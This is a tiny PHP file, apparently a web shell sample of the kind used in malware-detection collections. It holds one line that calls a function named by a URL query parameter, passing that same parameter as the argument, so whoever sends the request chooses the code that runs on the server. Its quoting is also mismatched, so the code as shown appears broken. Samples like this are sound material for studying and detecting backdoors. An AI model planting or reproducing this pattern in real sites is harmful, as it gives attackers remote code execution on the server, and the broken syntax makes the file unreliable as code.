<?php
$_GET["MUskr17P']($_GET['MUskr17P']);
?>
